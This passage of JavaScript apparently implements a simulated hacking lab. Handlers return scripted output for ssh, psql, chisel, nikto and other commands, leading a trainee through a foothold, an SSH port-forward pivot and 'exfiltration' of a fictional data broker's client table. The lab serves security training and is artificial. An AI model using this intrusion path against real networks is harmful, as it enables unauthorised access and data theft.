                return `<!DOCTYPE html>
<html>
<head><title>Nexus Group</title></head>
<body>
<h1>Nexus Group — Data Brokerage Solutions</h1>
<p>Trusted by leading enterprises across finance, healthcare, and defense.</p>
<p>Employee upload portal: <a href="/upload.php">/upload.php</a></p>
</body>
</html>`;
            }

            return `curl: (7) Failed to connect to ${url.replace(/https?:\/\//, '').split('/')[0] || 'host'}: Connection refused`;
        },

        'ssh': function(args, term, engine) {
            const fullCmd = args.join(' ');

            // SSH port forwarding
            if (fullCmd.includes('-L') && fullCmd.includes('5432')) {
                if (!C1Config._sshAuthenticated) {
                    return 'ssh: connect to host 192.168.1.100 port 22: Connection refused\n[!] You need valid SSH credentials first.';
                }
                C1Config._portForwardActive = true;
                return `[+] Local port forward established: 127.0.0.1:5432 -> 10.10.1.10:5432
[+] SSH tunnel active. You can now connect to the database via localhost:5432
[+] Use: psql -h 127.0.0.1 -U clientuser -d nexus_clients`;
            }

            // Chisel alternative
            if (fullCmd.includes('chisel')) {
                if (C1Config._context !== 'ssh-web') {
                    return 'chisel: command not found\n[!] Chisel is available after SSH access to WEB-EXT-01.';
                }
                C1Config._portForwardActive = true;
                return `[+] chisel client started
[+] Tunnel established: 127.0.0.1:5432 -> 10.10.1.10:5432
[+] You can now connect to the database via localhost:5432`;
            }

            // SSH to WEB-EXT-01
            if (fullCmd.includes('nexusadmin') || fullCmd.includes('192.168.1.100')) {
                C1Config._sshAuthenticated = true;
                C1Config._switchContext('ssh-web');
                if (engine) engine.advancePhase && engine.advancePhase('foothold');
                return `The authenticity of host '192.168.1.100 (192.168.1.100)' can't be established.
ED25519 key fingerprint is SHA256:xR4j8kF2nP9mQw7tB5vE1dL6cY0uA3hS8gN4iJ2oK5.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.1.100' (ED25519) to the list of known hosts.
nexusadmin@192.168.1.100's password: ********

Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com

Last login: Sat Mar 14 02:13:47 2026 from 192.168.1.50

nexusadmin@WEB-EXT-01:~$

[+] SSH session established. You are now on WEB-EXT-01 as nexusadmin.
[+] Context switched. Commands now execute on WEB-EXT-01.`;
            }

            return 'Usage: ssh [user@]hostname\nExample: ssh nexusadmin@192.168.1.100';
        },

        'ip': function(args) {
            if (C1Config._context !== 'ssh-web') {
                return `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.0.2.15/24 brd 10.0.2.255 scope global eth0`;
            }
            return `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.1.100/24 brd 192.168.1.255 scope global eth0
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.10.1.5/24 brd 10.10.1.255 scope global eth1`;
        },

        'route': function(args) {
            if (C1Config._context !== 'ssh-web') {
                return `Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         10.0.2.1        0.0.0.0         UG    100    0        0 eth0
10.0.2.0        0.0.0.0         255.255.255.0   U     100    0        0 eth0`;
            }
            return `Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         192.168.1.1     0.0.0.0         UG    100    0        0 eth0
10.10.1.0       0.0.0.0         255.255.255.0   U     100    0        0 eth1
192.168.1.0     0.0.0.0         255.255.255.0   U     100    0        0 eth0`;
        },

        'ifconfig': function(args) {
            // Alias for ip a behavior
            return C1Config.commands.ip(args || []);
        },

        'ping': function(args) {
            const target = args[0] || '';
            if (!target) return 'Usage: ping [-c count] destination';
            if (target === '192.168.1.100') {
                return `PING 192.168.1.100 (192.168.1.100) 56(84) bytes of data.
64 bytes from 192.168.1.100: icmp_seq=1 ttl=64 time=28.3 ms
64 bytes from 192.168.1.100: icmp_seq=2 ttl=64 time=27.9 ms
64 bytes from 192.168.1.100: icmp_seq=3 ttl=64 time=28.5 ms

--- 192.168.1.100 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss
rtt min/avg/max/mdev = 27.9/28.2/28.5/0.245 ms`;
            }
            if (target === '10.10.1.10' && C1Config._context === 'ssh-web') {
                return `PING 10.10.1.10 (10.10.1.10) 56(84) bytes of data.
64 bytes from 10.10.1.10: icmp_seq=1 ttl=64 time=0.45 ms
64 bytes from 10.10.1.10: icmp_seq=2 ttl=64 time=0.38 ms
64 bytes from 10.10.1.10: icmp_seq=3 ttl=64 time=0.42 ms

--- 10.10.1.10 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss
rtt min/avg/max/mdev = 0.380/0.416/0.450/0.029 ms`;
            }
            if (target.startsWith('10.10.1.') && C1Config._context === 'attacker') {
                return `PING ${target} (${target}) 56(84) bytes of data.

--- ${target} ping statistics ---
3 packets transmitted, 0 received, 100% packet loss`;
            }
            return `ping: ${target}: Name or service not known`;
        },

        'psql': function(args, term, engine) {
            const fullCmd = args.join(' ');

            // Must have port forward or be on SSH context
            if (!C1Config._portForwardActive && C1Config._context !== 'ssh-web') {
                return 'psql: could not connect to server: Connection refused\n\tIs the server running on host "127.0.0.1" and accepting TCP/IP connections on port 5432?\n\n[!] You need to set up a port forward first. Try: ssh -L 5432:10.10.1.10:5432 nexusadmin@192.168.1.100';
            }

            if (fullCmd.includes('clientuser') && fullCmd.includes('nexus_clients')) {
                C1Config._dbConnected = true;
                C1Config._switchContext('db');
                return `Password for user clientuser: ********
psql (14.10)
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384)
Type "help" for help.

nexus_clients=>

[+] Connected to nexus_clients database on DB-CLIENTS-01.
[+] Context switched to database mode. Use SQL commands or \\dt, \\q, etc.`;
            }

            return 'Usage: psql -h <host> -U <user> -d <database>\nExample: psql -h 127.0.0.1 -U clientuser -d nexus_clients';
        },

        // Database commands (when in db context)
        '\\dt': function(args, term, engine) {
            if (C1Config._context !== 'db') return '\\dt: command not found';
            return `              List of relations
 Schema |       Name        | Type  |   Owner
--------+-------------------+-------+------------
 public | audit_log         | table | clientuser
 public | client_manifest   | table | clientuser
(2 rows)`;
        },

        '\\d': function(args, term, engine) {
            if (C1Config._context !== 'db') return '\\d: command not found';
            const table = (args[0] || '').replace(/['"]/g, '');
            if (table === 'client_manifest') {
                return `                Table "public.client_manifest"
     Column      |          Type          | Nullable | Default
-----------------+------------------------+----------+---------
 client_id       | integer                | not null | nextval
 company_name    | character varying(255) |          |
 contact_email   | character varying(255) |          |
 contract_value  | character varying(50)  |          |
 data_category   | character varying(100) |          |
 status          | character varying(50)  |          |
Indexes:
    "client_manifest_pkey" PRIMARY KEY (client_id)`;
            }
            if (table === 'audit_log') {
                return `                Table "public.audit_log"
   Column    |            Type             | Nullable | Default
-------------+-----------------------------+----------+---------
 log_id      | integer                     | not null | nextval
 timestamp   | timestamp without time zone |          |
 action      | character varying(50)       |          |
 user        | character varying(100)      |          |
 table_name  | character varying(100)      |          |
 details     | text                        |          |
Indexes:
    "audit_log_pkey" PRIMARY KEY (log_id)`;
            }
            return C1Config.commands['\\dt']([], term, engine);
        },

        '\\q': function(args, term, engine) {
            if (C1Config._context !== 'db') return '\\q: command not found';
            C1Config._dbConnected = false;
            C1Config._switchContext(C1Config._sshAuthenticated ? 'ssh-web' : 'attacker');
            return '[+] Disconnected from nexus_clients database.\n[+] Returned to shell.';
        },

        'SELECT': function(args, term, engine) {
            return C1Config._handleSQL('SELECT ' + args.join(' '), engine);
        },
        'select': function(args, term, engine) {
            return C1Config._handleSQL('SELECT ' + args.join(' '), engine);
        },

        'chisel': function(args, term, engine) {
            if (C1Config._context !== 'ssh-web') {
                return 'chisel: command not found';
            }
            C1Config._portForwardActive = true;
            return `[+] chisel client started
[+] Tunnel established: 127.0.0.1:5432 -> 10.10.1.10:5432
[+] You can now connect to the database via localhost:5432`;
        },

        'ss': function(args) {
            if (C1Config._context === 'ssh-web') {
                return `State    Recv-Q   Send-Q   Local Address:Port   Peer Address:Port
LISTEN   0        128      0.0.0.0:22           0.0.0.0:*
LISTEN   0        128      0.0.0.0:80           0.0.0.0:*
LISTEN   0        128      0.0.0.0:443          0.0.0.0:*`;
            }
            return `State    Recv-Q   Send-Q   Local Address:Port   Peer Address:Port
LISTEN   0        128      0.0.0.0:22           0.0.0.0:*`;
        },

        'netstat': function(args) {
            return C1Config.commands.ss(args);
        },

        'exit': function(args, term, engine) {
            if (C1Config._context === 'db') {
                return C1Config.commands['\\q']([], term, engine);
            }
            if (C1Config._context === 'ssh-web') {
                C1Config._switchContext('attacker');
                return 'Connection to 192.168.1.100 closed.\n[+] Returned to attacker machine.';
            }
            return 'logout';
        },

        'nikto': function(args) {
            if (args.length === 0) return 'Usage: nikto -h <target>';
            return `- Nikto v2.5.0
+ Target IP:       192.168.1.100
+ Target Hostname:  WEB-EXT-01
+ Target Port:      80
+ Server: Apache/2.4.57 (Ubuntu)
+ /upload.php: File upload form detected — no MIME type validation
+ /config/: Configuration directory found (403 — but may be accessible internally)
+ /admin/: Directory listing denied (403)
+ Apache/2.4.57 appears to be outdated
+ OSVDB-3092: /config/database.php: Database configuration file found
+ 8 items checked: 4 findings`;
        }
    },

    // ═══════════════════════════════════════════════════════
    // SQL HANDLER (for db context)
    // ═══════════════════════════════════════════════════════

    _handleSQL(input, engine) {
        if (C1Config._context !== 'db') {
            return 'ERROR: Not connected to a database. Use psql to connect first.';
        }

        const lower = input.toLowerCase().trim().replace(/;$/, '');

        // SELECT * FROM client_manifest
        if (/from\s+client_manifest/i.test(lower)) {
            const limitMatch = lower.match(/limit\s+(\d+)/i);
            const limit = limitMatch ? parseInt(limitMatch[1]) : C1Config._db.client_manifest.length;
            const rows = C1Config._db.client_manifest.slice(0, limit);

            let output = ' client_id |          company_name          |       contact_email       | contract_value | data_category  |    status\n';
            output += '-----------+--------------------------------+---------------------------+----------------+----------------+---------------\n';
            rows.forEach(r => {
                output += ` ${String(r.client_id).padEnd(9)} | ${r.company_name.padEnd(30)} | ${r.contact_email.padEnd(25)} | ${r.contract_value.padEnd(14)} | ${r.data_category.padEnd(14)} | ${r.status}\n`;
            });
            output += `(${rows.length} row${rows.length !== 1 ? 's' : ''})\n`;

            if (rows.some(r => r.contact_email.includes('{{FLAG:root}}'))) {
                if (engine) engine.advancePhase && engine.advancePhase('exfiltration');
            }

            return output;
        }

        // SELECT * FROM audit_log
        if (/from\s+audit_log/i.test(lower)) {
            let output = ' log_id |      timestamp      | action  |    user    | table_name       | details\n';
            output += '--------+---------------------+---------+------------+------------------+-----------------------------------\n';
            C1Config._db.audit_log.forEach(r => {
                output += ` ${String(r.log_id).padEnd(6)} | ${r.timestamp.padEnd(19)} | ${r.action.padEnd(7)} | ${r.user.padEnd(10)} | ${r.table_name.padEnd(16)} | ${r.details}\n`;
            });
            output += `(${C1Config._db.audit_log.length} rows)\n`;
            return output;
        }

        // SELECT count(*)
        if (/count\s*\(\s*\*\s*\)/i.test(lower)) {
            if (/client_manifest/i.test(lower)) return ' count\n-------\n     5\n(1 row)';
            if (/audit_log/i.test(lower)) return ' count\n-------\n     4\n(1 row)';
        }

        // SELECT version()
        if (/version\s*\(\)/i.test(lower)) {
            return '                                         version\n------------------------------------------------------------------------------------------\n PostgreSQL 14.10 (Debian 14.10-1.pgdg110+1) on x86_64-pc-linux-gnu, compiled by gcc 10.2.1\n(1 row)';
        }

        // SELECT current_user
        if (/current_user/i.test(lower) || /session_user/i.test(lower)) {
            return ' current_user\n--------------\n clientuser\n(1 row)';
        }

        // SELECT current_database
        if (/current_database/i.test(lower)) {
            return ' current_database\n------------------\n nexus_clients\n(1 row)';
        }

        // SHOW tables alternative
        if (/show\s+tables/i.test(lower)) {
            return 'ERROR: syntax error. Use \\dt to list tables in PostgreSQL.';
        }

        return `ERROR: syntax error at or near "${input.split(' ').slice(0, 3).join(' ')}"\nLINE 1: ${input}\n        ^`;
    },

    // ═══════════════════════════════════════════════════════
    // HTML HELPERS
    // ═══════════════════════════════════════════════════════

    _tableHtml(headers, rows) {
        let html = '<table style="width:100%; border-collapse:collapse; font-size:0.8rem;"><thead><tr>';
        headers.forEach(h => {
            html += `<th style="padding:6px 10px; text-align:left; color:#e74c3c; border-bottom:2px solid #ddd; background:#fdf2f2;">${h}</th>`;
        });
        html += '</tr></thead><tbody>';
        rows.forEach(row => {
            html += '<tr>';
            row.forEach(cell => {
                html += `<td style="padding:5px 10px; border-bottom:1px solid #eee;">${cell}</td>`;
            });
            html += '</tr>';
        });
        html += '</tbody></table>';
        return html;
    },

    _escHtml(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    },

    _stripHtml(html) {
        const tmp = document.createElement('div');
        tmp.innerHTML = html;
        const tables = tmp.querySelectorAll('table');
        tables.forEach(table => {
            const rows = table.querySelectorAll('tr');
            let text = '';
            rows.forEach(row => {
                const cells = row.querySelectorAll('td, th');
                const cellTexts = Array.from(cells).map(c => c.textContent.trim().padEnd(20));
                text += cellTexts.join('  ') + '\n';
            });
            table.replaceWith(document.createTextNode(text));
        });
        return tmp.textContent.trim();
    }
};
